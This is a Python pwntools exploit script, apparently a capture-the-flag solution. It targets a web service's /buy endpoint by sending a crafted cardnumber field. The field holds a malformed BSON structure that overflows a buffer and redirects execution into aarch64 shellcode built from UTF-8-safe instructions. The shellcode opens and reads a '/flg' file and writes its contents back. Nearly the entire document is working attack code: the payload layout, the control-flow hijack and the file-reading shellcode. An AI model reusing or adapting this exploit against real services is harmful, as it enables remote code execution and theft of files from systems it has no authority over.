#!/usr/bin/env python3
from pwn import *
import requests

HOST, PORT = (sys.argv[1], sys.argv[2]) if len(sys.argv) > 2 else ('localhost', 4567)
context.arch = 'aarch64'

ret = 0x5b8
size = 0x20
sc_addr = 0xfc33
jumper = size + 0xb # 0xb is header size?

CVC = b'\x10CVC\x00' + p32(123)
MON = b'\x10MON\x00' + p32(123)
YR  = b'\x10YR\x00'  + p32(123)

# overlap bson CC and NOP
# NOP := '\x10NNN...\x00' + NOP size
NOP = b'\x10' + b'NNNNNN'
card = b'p'*size + NOP + b'\xc3' + p16(ret)
CC = b'\x02CC\x00' + p32(size) + card + b'\x00'

evil  = b'\x10YR\x00' + asm(f'b {sc_addr - jumper}') + b'\x00'
_ = CVC + MON + YR + CC + p32(123) + evil # p32(123) = NOP size
fake_bson = p32(len(_)) + _

payload = fake_bson.ljust(384, b'\x00')

# jmp to shellcode
card = b'b'*8 + p16(jumper)
CC = b'\x02CC\x00' + p32(0) + card + b'\x00'
_ = CVC + MON + YR + CC + b'\x00'
fake_bson = p32(len(_)) + _

path = 0xfc73
x1 = 0xfc22
buf = 0x400
utf8_nop = 'beq 0x0030;'

# open
_ =  'add w0, w1, 0;'
_ +=f'add w0, w0, {path - x1};'
_ += 'add w1, w24, 1;'
_ += 'add w8, w24, 4;'
_ += 'svc 0;'
_ += utf8_nop

# read
_ += 'add w0, w24, 0;'
_ +=f'add w1, w24, {buf};'
_ += 'add w2, w24, 0x100;'
_ += 'add w8, w24, 5;'
_ += 'svc 0;'
_ += utf8_nop

# write
_ +=f'add w0, w24, {buf};'
_ += 'add w8, w24, 0;'
_ += 'svc 0;'
_ += utf8_nop

sc = asm(_)
sc.decode('utf8')

payload += fake_bson + b'\x00' + sc + b'/flg\x00'

_ = b'4485-7873-4804-0088' + b'\x00' * 0x147 + payload

r = requests.post(f'http://{HOST}:{PORT}/buy', data={'cardnumber': _})

print(r.text)
